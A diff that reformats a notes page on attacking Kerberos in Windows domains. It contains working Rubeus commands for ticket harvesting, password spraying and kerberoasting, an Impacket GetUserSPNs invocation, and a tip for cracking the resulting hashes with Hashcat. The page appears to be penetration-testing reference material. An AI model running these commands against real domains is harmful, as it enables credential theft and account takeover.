@@ -83,15 +83,14 @@ Rubeus is a Windows-only post-exploitation tool for attacking Kerberos. No compi
 NOTE: To use Rebueus you need to already be on the domain you are attacking, or alternately need to have mapped the domain controller (which normally hosts the KDC) IP address properly in C:/Windows/System32/drivers/etc/hosts.
 
 ```powershell
-# Harvest ticket granting tickets observed by the current
-# machine. Probably works best when run on a domain
-# controller.
+# Harvest ticket granting tickets observed by the current machine.
+# Probably works best when run on a domain controller.
 #
 Rubeus.exe harvest /interval:30
 
-# Spray the specified password across all known users and
-# generate a ticket giving ticket for successful
-# authentications. (Can trigger account lockouts!)
+# Spray the specified password across all known users and generate a
+# ticket giving ticket for successful authentications. (Can trigger
+# account lockouts!)
 #
 Rubeus.exe brute /password:ThePasswordToSpray /noticket
 ```
@@ -109,8 +108,8 @@ The main defenses against kerberoasting are (1) strong passwords and (2) making 
 ### Rubeus
 
 ```powershell
-# Extract password hashes for all known kerberoastable
-# accounts using Rubeus.
+# Extract password hashes for all known kerberoastable accounts using
+# Rubeus.
 #
 Rubeus.exe kerberoast
 ```
@@ -125,9 +124,9 @@ Impacket can identify kerberoastable accounts and dump packets remotely. It come
 
 ```bash
 sudo python3 \
-/usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
-${DOMAIN}/${USER}:${PASSWORD} \
--dc-ip $DOMAIN_CONTROLLER_IP -request
+     /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
+     ${DOMAIN}/${USER}:${PASSWORD} \
+     -dc-ip $DOMAIN_CONTROLLER_IP -request
 ```
 
 The password hashes output here can then be cracked with Hashcat (use the 13100 hash mode).
